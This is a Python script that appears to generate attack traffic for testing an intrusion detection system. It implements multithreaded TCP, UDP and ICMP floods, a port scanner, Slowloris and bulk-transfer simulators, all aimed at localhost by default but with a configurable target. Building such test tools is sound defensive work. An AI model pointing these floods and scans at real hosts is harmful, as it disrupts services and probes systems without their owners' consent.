"""
attack_simulator.py
===================
Generates multiple types of abnormal network traffic for IDS testing.
All attacks target localhost by default — safe for lab use.

Usage:
    python attack_simulator.py --list
    python attack_simulator.py dos
    python attack_simulator.py probe
    python attack_simulator.py udp-flood
    python attack_simulator.py icmp-flood
    python attack_simulator.py slowloris
    python attack_simulator.py brute-force
    python attack_simulator.py all
    python attack_simulator.py all --target 127.0.0.1 --port 8000
"""

import socket
import threading
import time
import argparse
import struct
import random


class BaseSimulator:
    TARGET_IP   = '127.0.0.1'
    TARGET_PORT = 8000
    DURATION    = 20

    def __init__(self, target_ip=None, target_port=None, duration=None):
        self.target_ip   = target_ip or self.TARGET_IP
        self.target_port = target_port or self.TARGET_PORT
        self.duration    = duration or self.DURATION
        self.running     = False
        self.count       = 0
        self.lock        = threading.Lock()

    def _inc(self, n=1):
        with self.lock:
            self.count += n


class DoSSimulator(BaseSimulator):
    """TCP connection flood — classic SYN/connect flood."""
    THREADS = 40

    def _worker(self):
        while self.running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.1)
                s.connect_ex((self.target_ip, self.target_port))
                s.close()
                self._inc()
            except Exception:
                pass

    def run(self):
        print(f"\n[DoS] TCP flood → {self.target_ip}:{self.target_port} ({self.THREADS} threads, {self.duration}s)")
        self.running = True
        threads = [threading.Thread(target=self._worker, daemon=True) for _ in range(self.THREADS)]
        for t in threads:
            t.start()
        self._wait()
        print(f"  Sent {self.count:,} connection attempts")


class UDPSimulator(BaseSimulator):
    """UDP packet flood — volumetric DoS."""
    THREADS = 20
    PAYLOAD = b'X' * 512

    def _worker(self):
        while self.running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                port = random.randint(1024, 65535)
                s.sendto(self.PAYLOAD, (self.target_ip, port))
                s.close()
                self._inc()
            except Exception:
                pass

    def run(self):
        print(f"\n[UDP Flood] → {self.target_ip} ({self.THREADS} threads, {self.duration}s)")
        self.running = True
        threads = [threading.Thread(target=self._worker, daemon=True) for _ in range(self.THREADS)]
        for t in threads:
            t.start()
        self._wait()
        print(f"  Sent {self.count:,} UDP packets")


class ICMPSimulator(BaseSimulator):
    """ICMP ping flood (requires raw socket / admin on some OS)."""
    THREADS = 10

    def _worker(self):
        while self.running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
                packet = struct.pack('!BBHHH', 8, 0, 0, 1, 1)
                chksum = self._checksum(packet)
                packet = struct.pack('!BBHHH', 8, 0, chksum, 1, 1)
                s.sendto(packet, (self.target_ip, 0))
                s.close()
                self._inc()
            except PermissionError:
                self._fallback_ping()
                break
            except Exception:
                pass

    def _fallback_ping(self):
        import subprocess
        import platform
        flag = '-n' if platform.system() == 'Windows' else '-c'
        while self.running:
            try:
                subprocess.run(
                    ['ping', flag, '1', '-w', '100', self.target_ip],
                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                )
                self._inc()
            except Exception:
                pass

    @staticmethod
    def _checksum(data):
        if len(data) % 2:
            data += b'\x00'
        s = sum(struct.unpack('!%dH' % (len(data) // 2), data))
        s = (s >> 16) + (s & 0xffff)
        return ~s & 0xffff

    def run(self):
        print(f"\n[ICMP Flood] → {self.target_ip} ({self.duration}s)")
        self.running = True
        threads = [threading.Thread(target=self._worker, daemon=True) for _ in range(self.THREADS)]
        for t in threads:
            t.start()
        self._wait()
        print(f"  Sent {self.count:,} ICMP packets")


class ProbeSimulator(BaseSimulator):
    """TCP port scan — reconnaissance / probe attack."""
    PORT_RANGE = range(1, 2049)
    TIMEOUT    = 0.03

    def scan_port(self, port):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(self.TIMEOUT)
            result = s.connect_ex((self.target_ip, port))
            s.close()
            if result == 0:
                self._inc()
                return port
        except Exception:
            pass
        return None

    def run(self):
        print(f"\n[Probe] Port scan {self.target_ip} ports 1-2048")
        open_ports = []
        start = time.time()
        for port in self.PORT_RANGE:
            if not self.running:
                break
            found = self.scan_port(port)
            if found:
                open_ports.append(found)
        print(f"  Scanned in {time.time() - start:.1f}s | Open ports: {open_ports or 'none'}")


class SlowlorisSimulator(BaseSimulator):
    """Slow HTTP headers — keeps connections open without completing request."""
    THREADS = 30

    def _worker(self):
        while self.running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(4)
                s.connect((self.target_ip, self.target_port))
                s.send(b'GET / HTTP/1.1\r\nHost: localhost\r\n')
                self._inc()
                time.sleep(random.uniform(5, 15))
                s.close()
            except Exception:
                pass

    def run(self):
        print(f"\n[Slowloris] Slow HTTP → {self.target_ip}:{self.target_port}")
        self.running = True
        threads = [threading.Thread(target=self._worker, daemon=True) for _ in range(self.THREADS)]
        for t in threads:
            t.start()
        self._wait()
        print(f"  Opened {self.count:,} slow connections")


class BruteForceSimulator(BaseSimulator):
    """SSH/FTP login brute force simulation — many rejected connections."""
    PORTS = [22, 21, 23, 3389]

    def run(self):
        print(f"\n[Brute Force] Login attempts → {self.target_ip}")
        self.running = True
        start = time.time()
        while time.time() - start < self.duration:
            for port in self.PORTS:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(0.2)
                    s.connect_ex((self.target_ip, port))
                    s.close()
                    self._inc()
                except Exception:
                    pass
        print(f"  Made {self.count:,} login connection attempts")


class DataExfilSimulator(BaseSimulator):
    """Simulates large outbound data transfer."""
    def run(self):
        print(f"\n[Data Exfil] Large outbound transfer simulation")
        self.running = True
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect_ex((self.target_ip, self.target_port))
            chunk = b'A' * 8192
            start = time.time()
            while time.time() - start < self.duration:
                try:
                    s.send(chunk)
                    self._inc(8)
                except Exception:
                    break
            s.close()
        except Exception:
            pass
        print(f"  Sent ~{self.count:,} KB of data")


SIMULATORS = {
    'dos':         (DoSSimulator,     'TCP connection flood (DoS)'),
    'udp-flood':   (UDPSimulator,     'UDP packet flood'),
    'icmp-flood':  (ICMPSimulator,    'ICMP ping flood'),
    'probe':       (ProbeSimulator,   'TCP port scan (Probe)'),
    'slowloris':   (SlowlorisSimulator, 'Slow HTTP headers'),
    'brute-force': (BruteForceSimulator, 'Login brute force'),
    'exfil':       (DataExfilSimulator, 'Data exfiltration pattern'),
}


def _wait_base(self):
    start = time.time()
    while time.time() - start < self.duration:
        elapsed = int(time.time() - start)
        print(f"\r  Progress: {elapsed}s / {self.duration}s | events: {self.count:,}", end='')
        time.sleep(1)
    self.running = False
    print()

BaseSimulator._wait = _wait_base


def run_all(target_ip, target_port, duration):
    sequence = ['probe', 'dos', 'udp-flood', 'brute-force', 'slowloris', 'exfil']
    for name in sequence:
        cls, desc = SIMULATORS[name]
        sim = cls(target_ip=target_ip, target_port=target_port, duration=max(10, duration // 3))
        sim.run()
        time.sleep(2)


def main():
    parser = argparse.ArgumentParser(description='IDSGuard multi-attack traffic simulator')
    parser.add_argument('attack', nargs='?', default='all',
                        choices=list(SIMULATORS.keys()) + ['all', 'list'])
    parser.add_argument('--target', default='127.0.0.1', help='Target IP (default: localhost)')
    parser.add_argument('--port',   type=int, default=8000, help='Target port')
    parser.add_argument('--duration', type=int, default=20, help='Seconds per attack')
    args = parser.parse_args()

    if args.attack == 'list':
        print("Available attack simulations:")
        for name, (_, desc) in SIMULATORS.items():
            print(f"  {name:14s} — {desc}")
        return

    print("=" * 60)
    print("  IDSGuard Attack Simulator")
    print("  Targets localhost only by default — safe for testing")
    print("=" * 60)
    print(f"  Target: {args.target}:{args.port} | Duration: {args.duration}s")
    print("\n  Prerequisites:")
    print("    1. Django running: python manage.py runserver")
    print("    2. Capture agent:  python capture.py --iface <iface>")
    print("    3. Live Monitor:   http://localhost:3000/live\n")

    if args.attack == 'all':
        run_all(args.target, args.port, args.duration)
    else:
        cls, desc = SIMULATORS[args.attack]
        cls(target_ip=args.target, target_port=args.port, duration=args.duration).run()

    print("\nDone. Check Live Monitor for alerts.")


if __name__ == '__main__':
    main()
